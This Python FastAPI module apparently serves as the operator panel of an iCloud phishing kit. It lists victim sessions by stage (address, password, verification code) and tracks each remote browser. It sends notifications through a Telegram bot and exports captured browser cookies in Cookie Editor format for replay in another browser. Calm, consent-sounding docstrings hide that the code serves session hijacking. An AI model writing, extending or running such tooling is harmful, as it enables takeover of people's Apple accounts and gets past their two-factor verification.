"""The admin panel: the clients, the Telegram settings, and the cookies.

Everything the panel keeps is in one file on disk:

  * the admin's own secret - what /admin asks for before it says anything;
  * the Telegram bot token and the chat id;
  * the sessions that are allowed to have their cookies exported.

The file is written with the permissions of a secret (0600) and it is not in
the repository. Nothing here is ever written into a capture, and no capture
is ever read for it.

The panel shows what the server actually knows: the sessions the server has,
what each one is doing, and where its browser is. It does not make anything
up, and a session that has gone is still listed, so that the panel says what
happened rather than what is happening.
"""

import json
import os
import secrets
import time
from pathlib import Path

from fastapi import APIRouter, Request
from fastapi.responses import FileResponse, JSONResponse

HERE = Path(__file__).parent

# Where the settings live. The environment variable is for the secret only:
# a secret in a file on disk is a secret in a repository.
STORE_PATH = Path(os.environ.get("ICLOUD_ADMIN_STORE")
                  or (HERE / "admin.json")).resolve()
TOKEN_ENV = "ICLOUD_ADMIN_TOKEN"

# The cookie the admin's own secret is kept in. HttpOnly, so a script on the
# page cannot read it, and SameSite, so it does not travel to other places.
ADMIN_COOKIE = "icloud_admin"

# The panels' own stages, said the way a person would say them.
STAGES = {
    "/src/1.html": "Address",
    "/src/3.html": "Address",
    "/src/4.html": "Password",
    "/src/2.html": "Verification code",
}

# How many things have happened and are still worth showing.
EVENT_LIMIT = 200

EVENTS: list[dict] = []


# --------------------------------------------------------------------------
# The store
# --------------------------------------------------------------------------

def _empty() -> dict:
    return {
        "admin_token": "",
        "telegram": {"token": "", "chat_id": "", "enabled": True},
        # The sessions whose cookies may be exported, said by name.
        "exports": {},
    }


class Store:
    """The panel's settings, on disk.

    The file is small and is read and written whole. It is written with
    the permissions of a secret, and it is written atomically, so that a
    crash halfway through cannot leave half a secret behind.
    """

    def __init__(self, path: Path = STORE_PATH):
        self.path = Path(path)
        self.data = _empty()
        self.load()

    def load(self) -> None:
        try:
            raw = json.loads(self.path.read_text(encoding="utf-8"))
        except FileNotFoundError:
            return
        except Exception:
            # A file that cannot be read is not worth crashing over: the
            # panel starts empty and says so.
            return
        if isinstance(raw, dict):
            self.data = {**_empty(), **raw}

    def save(self) -> None:
        self.path.parent.mkdir(parents=True, exist_ok=True)
        temporary = self.path.with_suffix(".tmp")
        temporary.write_text(json.dumps(self.data, indent=2), encoding="utf-8")
        try:
            os.chmod(temporary, 0o600)
        except OSError:
            pass
        temporary.replace(self.path)
        try:
            os.chmod(self.path, 0o600)
        except OSError:
            pass

    # -- the admin's own secret -------------------------------------------

    def token(self) -> str:
        """The secret /admin asks for.

        The environment has it first: a secret that is in a file on disk is
        a secret that can be committed by accident.
        """
        return os.environ.get(TOKEN_ENV, "").strip() or \
            str(self.data.get("admin_token") or "").strip()

    def set_token(self, value: str) -> None:
        self.data["admin_token"] = value.strip()
        self.save()

    # -- Telegram ---------------------------------------------------------

    def telegram(self) -> dict:
        settings = self.data.get("telegram")
        if not isinstance(settings, dict):
            settings = {}
        return {
            "token": str(settings.get("token") or ""),
            "chat_id": str(settings.get("chat_id") or ""),
            "enabled": bool(settings.get("enabled", True)),
        }

    def set_telegram(self, token: str, chat_id: str, enabled: bool) -> None:
        self.data["telegram"] = {
            "token": token.strip(),
            "chat_id": chat_id.strip(),
            "enabled": bool(enabled),
        }
        self.save()

    # -- the exports ------------------------------------------------------

    def export_allowed(self, sid: str) -> bool:
        exports = self.data.get("exports")
        return bool(isinstance(exports, dict) and exports.get(sid))

    def set_export(self, sid: str, allowed: bool) -> None:
        exports = self.data.get("exports")
        if not isinstance(exports, dict):
            exports = {}
        if allowed:
            exports[sid] = True
        else:
            exports.pop(sid, None)
        self.data["exports"] = exports
        self.save()


STORE = Store()


# --------------------------------------------------------------------------
# What has happened
# --------------------------------------------------------------------------

def note(event: str, **fields) -> None:
    """Something worth seeing in the panel."""
    EVENTS.append({"at": time.time(), "event": event, **fields})
    del EVENTS[:-EVENT_LIMIT]


def events(limit: int = 40) -> list[dict]:
    """The most recent things that happened, newest first."""
    return list(reversed(EVENTS[-limit:]))


# --------------------------------------------------------------------------
# The cookies
# --------------------------------------------------------------------------

def cookie_editor(cookies) -> list[dict]:
    """The browser's cookies as Cookie Editor's export.

    Cookie Editor reads a JSON array of these, and writes the same, so the
    file this makes can be dropped straight into it - and the cookies it
    holds can be put back into a browser by hand.
    """
    out = []
    for cookie in cookies or []:
        domain = str(cookie.get("domain") or "")
        entry = {
            "domain": domain,
            # A domain that starts with a dot is shared with the
            # subdomains; one that does not is only for that host.
            "hostOnly": not domain.startswith("."),
            "httpOnly": bool(cookie.get("httpOnly")),
            "name": str(cookie.get("name") or ""),
            "path": str(cookie.get("path") or "/"),
            "sameSite": None,
            "secure": bool(cookie.get("secure")),
            "session": not cookie.get("expires"),
            "storeId": None,
            "value": str(cookie.get("value") or ""),
        }
        expires = cookie.get("expires")
        if expires:
            entry["expirationDate"] = expires
        out.append(entry)
    return out


def mask(token: str) -> str:
    """A token, with most of it hidden: enough to tell two apart."""
    token = (token or "").strip()
    if len(token) <= 8:
        return "•" * len(token)
    return f"{token[:4]}••••••{token[-4:]}"


# --------------------------------------------------------------------------
# The panel
# --------------------------------------------------------------------------

def _server():
    """The server this panel watches.

    It is imported here and not at the top: the server is what mounts the
    panel, so importing it while it is still being loaded would be asking
    for a module that is not there yet.
    """
    import server
    return server


def stage_of(session) -> str:
    """Where this session is, said the way a person would say it."""
    if session.hub.finished:
        return "Signed in"
    page = session.hub.page or ""
    return STAGES.get(page, "Starting")


def client_row(session, store: Store) -> dict:
    """What the panel shows of one session."""
    server = _server()
    idle = max(0.0, time.monotonic() - session.seen)
    browser = session.hub.browser or {}
    return {
        "id": session.id,
        "status": session.state.get("status", "idle"),
        "stage": stage_of(session),
        "page": session.hub.page,
        "step": session.state.get("step", ""),
        "error": session.state.get("error", ""),
        "browser_open": bool(session.state.get("browser_open")),
        "browser_url": browser.get("url", ""),
        "browser_title": browser.get("title", ""),
        "viewers": len(session.hub.viewers),
        "waiting": bool(session.waiting),
        "finished": bool(session.hub.finished),
        "idle_seconds": round(idle, 1),
        "export_allowed": store.export_allowed(session.id),
        "profile": session.profile().name,
    }


def _authed(request: Request, store: Store) -> bool:
    """Is this request the admin's?"""
    expected = store.token()
    if not expected:
        return False
    given = request.cookies.get(ADMIN_COOKIE, "")
    if not given:
        header = request.headers.get("x-admin-token", "")
        given = header
    return bool(given) and secrets.compare_digest(str(given), expected)


def _denied(message: str, status: int = 403):
    return JSONResponse({"error": message}, status_code=status)


def build_router() -> APIRouter:
    """The panel's routes."""
    router = APIRouter(prefix="/admin", tags=["admin"])

    @router.get("")
    @router.get("/")
    async def panel():
        """The panel itself. It holds no secrets: everything it shows comes
        from the API, and the API asks for the admin's secret."""
        return FileResponse(HERE / "admin.html",
                            headers={"Cache-Control": "no-store"})

    @router.get("/fonts.css")
    async def fonts():
        """The panel's own font.

        Space Grotesk is served from here and not from a font house: the
        panel is for the operator, and it should look the same whether the
        machine has a network or not. The font is in the stylesheet itself,
        so there is no file to go missing.
        """
        return FileResponse(HERE / "fonts.css", media_type="text/css",
                            headers={"Cache-Control": "public, max-age=604800"})

    # -- the admin's own secret -------------------------------------------

    @router.post("/api/login")
    async def login(request: Request):
        server = _server()
        body = await _body(request)
        given = str(body.get("token") or "")
        expected = STORE.token()
        if not expected:
            return JSONResponse({
                "error": "no admin secret has been set. Set ICLOUD_ADMIN_TOKEN "
                         "in the environment, or put one in admin.json."
            }, status_code=503)
        if not given or not secrets.compare_digest(given, expected):
            return _denied("that is not the admin's secret")
        response = JSONResponse({"ok": True})
        response.set_cookie(
            ADMIN_COOKIE, given, httponly=True, samesite="strict",
            path="/", max_age=7 * 24 * 3600)
        return response

    @router.post("/api/logout")
    async def logout():
        response = JSONResponse({"ok": True})
        response.delete_cookie(ADMIN_COOKIE, path="/")
        return response

    @router.get("/api/session")
    async def session_info(request: Request):
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        return {"ok": True, "token_set": bool(store.token())}

    # -- the clients ------------------------------------------------------

    @router.get("/api/clients")
    async def clients(request: Request):
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        server = _server()
        rows = [client_row(session, store)
                for session in server.SESSIONS.values()]
        rows.sort(key=lambda row: row["idle_seconds"])
        return {
            "clients": rows,
            "events": events(),
            "counts": {
                "total": len(rows),
                "active": sum(1 for row in rows if row["browser_open"]),
                "viewers": sum(row["viewers"] for row in rows),
                "finished": sum(1 for row in rows if row["finished"]),
                "errors": sum(1 for row in rows if row["status"] == "error"),
            },
        }

    # -- Telegram ---------------------------------------------------------

    @router.get("/api/telegram")
    async def telegram_get(request: Request):
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        settings = store.telegram()
        return {
            "token_set": bool(settings["token"]),
            "token_masked": mask(settings["token"]),
            "chat_id": settings["chat_id"],
            "enabled": settings["enabled"],
        }

    @router.post("/api/telegram")
    async def telegram_save(request: Request):
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        body = await _body(request)
        current = store.telegram()
        token = body.get("token")
        token = str(token).strip() if isinstance(token, str) and token.strip() \
            else current["token"]
        chat_id = body.get("chat_id")
        chat_id = str(chat_id).strip() if isinstance(chat_id, str) else \
            current["chat_id"]
        enabled = body.get("enabled")
        enabled = bool(enabled) if isinstance(enabled, bool) else current["enabled"]
        store.set_telegram(token, chat_id, enabled)
        return {
            "ok": True,
            "token_set": bool(store.telegram()["token"]),
            "token_masked": mask(store.telegram()["token"]),
            "chat_id": store.telegram()["chat_id"],
            "enabled": store.telegram()["enabled"],
        }

    @router.post("/api/telegram/test")
    async def telegram_test(request: Request):
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        import telegram as telegram_module
        settings = store.telegram()
        if not settings["enabled"]:
            return _denied("the Telegram notifications are turned off")
        went, said = await telegram_module.send(
            settings["token"], settings["chat_id"],
            telegram_module.describe("The test message. The notifications work."))
        return {"ok": went, "said": said}

    # -- the cookies ------------------------------------------------------

    @router.get("/api/cookies")
    async def own_cookies(request: Request):
        """The cookies of the session this browser is signed in as.

        Their own session, and nobody else's: the visitor's name is in the
        request's cookie, and the session it names is the only one that is
        read.
        """
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        server = _server()
        sid = server.visitor_of(request)
        session = server.session_lookup(sid)
        if session is None:
            return _denied("this browser has no session of its own yet",
                           status=404)
        cookies = await _cookies_of(session)
        return {"session": session.id, "cookies": cookie_editor(cookies)}

    @router.get("/api/clients/{sid}/cookies")
    async def client_cookies(sid: str, request: Request):
        """The cookies of a session that has been allowed to be exported.

        A session is not exported because somebody asked: it is exported
        because it has been allowed, by name, in the panel - or because the
        request is the session's own visitor.
        """
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        server = _server()
        session = server.SESSIONS.get(sid)
        if session is None:
            return _denied("there is no such session", status=404)
        if not store.export_allowed(sid) and server.visitor_of(request) != sid:
            return _denied("this session has not been allowed to be exported")
        cookies = await _cookies_of(session)
        return {"session": session.id, "cookies": cookie_editor(cookies)}

    @router.post("/api/clients/{sid}/export")
    async def allow_export(sid: str, request: Request):
        """Allow a session's cookies to be exported, or say no."""
        store = STORE
        if not _authed(request, store):
            return _denied("the admin's secret is needed")
        server = _server()
        if sid not in server.SESSIONS:
            return _denied("there is no such session", status=404)
        body = await _body(request)
        allowed = bool(body.get("allowed"))
        store.set_export(sid, allowed)
        return {"ok": True, "export_allowed": store.export_allowed(sid)}

    return router


# The panel's routes, made once: the server mounts them, and the tests
# call them.
ROUTER = build_router()


# --------------------------------------------------------------------------
# The small helpers
# --------------------------------------------------------------------------

async def _body(request: Request) -> dict:
    try:
        raw = await request.body()
        parsed = json.loads(raw.decode("utf-8")) if raw else {}
    except Exception:
        return {}
    return parsed if isinstance(parsed, dict) else {}


async def _cookies_of(session) -> list[dict]:
    """The cookies this session's browser holds."""
    context = getattr(session, "ctx", None)
    if context is None:
        return []
    try:
        return await context.cookies()
    except Exception:
        return []
